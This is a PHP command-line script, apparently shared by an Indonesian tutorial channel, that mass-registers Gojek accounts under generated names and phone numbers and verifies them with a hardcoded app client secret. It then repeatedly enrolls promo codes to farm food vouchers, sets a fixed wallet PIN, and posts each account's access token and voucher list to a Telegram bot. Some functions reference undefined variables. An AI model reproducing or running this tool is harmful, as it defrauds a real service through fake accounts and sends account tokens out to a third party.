<?php
date_default_timezone_set('Asia/Jakarta');
include "function1.php";
echo "\n";
echo "\e[96m            (SELAMAT DATANG BOSKUHH $input)               \n";
echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
echo color("green","# # # # # # # # # # # # # # # # # # # # # # # \n");
echo color("yellow","[•] Time : ".date('[d-m-Y] [H:i:s]')." \n");
echo color("purple","[•] WAITING PROSESSS ..... \n");
echo color("yellow","[•] Ramz Tutorial Channel \n");
echo color("green","[•] CARA MENULIS NOMOR PAKAI 62xxxxxxxxxx \n");
echo color("red","[•] KALAU GK BISA PAKE AJA 08xxxxxxxx \n");
echo color("nevy","[•] SCRIPT GRATIS RAMZ TUTORIAL \n");
echo color("blue","[•] PAIDOMU MOTIVASIKU 🤣 \n");
echo color("green","[•] JANGAN LUPA BERDOA SEBELUM CLAIM \n");
echo color("blue","[•] SUROBOYO LOST BOJOMU SEMANGATKU WKWKW \n");
echo color("red","# # # # # # # # # # # # # # # # # # # # # # # \n");
function register($no)
    {
    $nama = nama();
    $email = str_replace(" ", "", $nama) . mt_rand(1000, 9999);
    $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$no.'","signed_up_country":"ID"}';
    $register = request("/v5/customers", "", $data);
    if ($register['success'] == 1)
        {
        return $register['data']['otp_token'];
        }
      else
        {
      save("error_log.txt", json_encode($register));
        return false;
        }
    }

    function login($no)
    {

    $data = '{"phone":"+'.$no.'"}';
    $register = request("/v4/customers/login_with_phone", "", $data);
   
    if ($register['success'] == 1)
        {
        return $register['data']['login_token'];
        }
      else
        {
      save("error_log.txt", json_encode($register));
        return false;
        }
    }

function veriflogin($otp, $token)
    {
    $data = '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otp.'","otp_token":"'.$token.'"},"grant_type":"otp","scopes":"gojek:customer:transaction gojek:customer:readonly"}';
    $verif = request("/v4/customers/login/verify", "", $data);
    if ($verif['success'] == 1)
        {
        return $verif['data']['access_token'];
        }
      else
        {
      save("error_log.txt", json_encode($verif));
        return false;
        }
    }
function change($no)
{
    $data = '{"email":"' .$email . '","name":"'.$nama.'","phone":"+'.$no.'"}';
    $change = request("/v4/customers" ,"", $data);
    if ($change['success'] == 1) {
        return $change;
    }
    else{
        save("error_log.txt", json_encode($change));
        return false;
    }
}
function verifchange($otp,$uid)
{
    $data = '{"id":'.$uid.',"phone":"+'.$no.'","verificationCode":"'.$otp.'"}';
        $verifchange = request("/v4/customer/verificationUpdateProfil" ,"",$data);
        if ($verifchange['success'] == 1) {
            return $verifchange;
        }
        else{
            save("error_log.txt", json_encode($verifchange));
        return false;
        }
}
function verif($otp, $token)
    {
    $data = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $token . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
    $verif = request("/v5/customers/phone/verify", "", $data);
    if ($verif['success'] == 1)
        {
		$h=fopen("accgojek2.txt","a");
		fwrite($h,json_encode($verif)."\n");
		fclose($h); 
        return $verif['data']['access_token'];
        }
      else
        {
       save("error_log.txt", json_encode($verif));
        return false;
        }
    }
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("green","📶▶️ Kode verifikasi sudah di kirim")."\n";
        otp:
        echo color("purple","💬▶️ Otp : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("green","✔️▶️ Berhasil mendaftar\n");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo color("nevy","+] Your access token : ".$token."\n\n");
        save("token.txt",$token);
        echo color("nevy","\n▬▬▬▬▬▬▬▬▬▬▬▬🛠 REEDEM VOUCHER 🛠▬▬▬▬▬▬▬▬▬▬▬▬");
        echo "\n".color("nevy","🔒▶️ GOPUD 1");
        echo "\n".color("yellow","⏳▶️ Please wait.... Skip");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(20);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD0508"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","🔓▶️ Message: ".$message);
        goto gocar;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
	      gocar:
        echo "\n".color("nevy","🔒▶️ GOPUD 2");
        echo "\n".color("yellow","⏳▶️ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(20);
        }
        $code1 = request1('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD0508"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","🔓▶️ Message: ".$message);
        goto gofood;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
        gofood:
        echo "\n".color("nevy","🔒▶️ GOPUD 3");
        echo "\n".color("yellow","⏳▶️ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(10);
        }
        $code1 = request2('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD0508"}');
        $message = fetch_value($code1,'"message":"','"');
        echo "\n".color("green","🔓▶️ Message: ".$message);
        echo "\n".color("nevy","🔒▶️ GOPUD 4");
        echo "\n".color("yellow","⏳▶️ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(10);
        }
        $code1 = request2('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD0508"}');
        $message = fetch_value($code1,'"message":"','"');
        echo "\n".color("green","🔓▶️ Message: ".$message);
        echo "\n".color("nevy","🔒▶️ GOPUD 5");
        echo "\n".color("yellow","⏳▶️ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(5);
        $boba09 = request1('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"MAUGOFOOD0508"}');
        $messageboba09 = fetch_value($boba09,'"message":"','"');
        echo "\n".color("green","🔓▶️ Message: ".$messageboba09);
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
        $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
        $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
        $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
        $voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
        $voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
        $voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
        echo "\n".color("purple","🎫▶️ Total voucher ".$total." : ");
        echo "\n".color("blue","                     1. ".$voucher1);
        echo "\n".color("blue","                     2. ".$voucher2);
        echo "\n".color("green","                    3. ".$voucher3);
        echo "\n".color("green","                    4. ".$voucher4);
        echo "\n".color("nevy","                     5. ".$voucher5);
        echo "\n".color("nevy","                     6. ".$voucher6);
        echo "\n".color("red","                      7. ".$voucher7);
        echo "\n".color("red","                      8. ".$voucher8);
        echo "\n".color("purple","                   9. ".$voucher9);
        echo "\n".color("purple","                   10. ".$voucher10);
      	echo "\n".color("nevy","                     11. ".$voucher11);
        echo "\n".color("nevy","                     12. ".$voucher12);
        echo "\n".color("green","                    13. ".$voucher13);
        echo"\n";
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
        $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
        $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
        $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
        $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
        $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
        $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
        $TOKEN  = "1";
      	$chatid = "1";
      	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
      	$method	= "sendMessage";
      	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
      	$post = [
      		'chat_id' => $chatid,
                'text' => $pesan
        	];
                $header = [
                "X-Requested-With: XMLHttpRequest",
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
         setpin:
         echo "\n".color("purple","🔧▶️ SET PIN SEKLAIAN BIAR AMAN !!!: y/n ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" || $pilih1 == "Y"){
         //if($pilih1 == "y" && strpos($no, "628")){
         echo color("nevy","▬▬▬▬▬▬▬▬▬▬▬▬▬▬🔧 PIN MU = 181818 🔧▬▬▬▬▬▬▬▬▬▬▬▬")."\n";
         $data2 = '{"pin":"181818"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo "Otp pin: ";
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;
         }else if($pilih1 == "n" || $pilih1 == "N"){
         die();
         }else{
         echo color("red","-] GAGAL!!!\n");
         }
         }
         }
         }else{
         echo color("red","-] Otp yang anda input salah");
         echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";
         echo color("purple","!] Silahkan input kembali\n");
         goto otp;
         }
         }else{
         echo color("red","-] Nomor sudah teregistrasi");
         echo"\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n";
         echo color("purple","!] Silahkan registrasi kembali\n");
         }
//  }

// echo change()."\n";
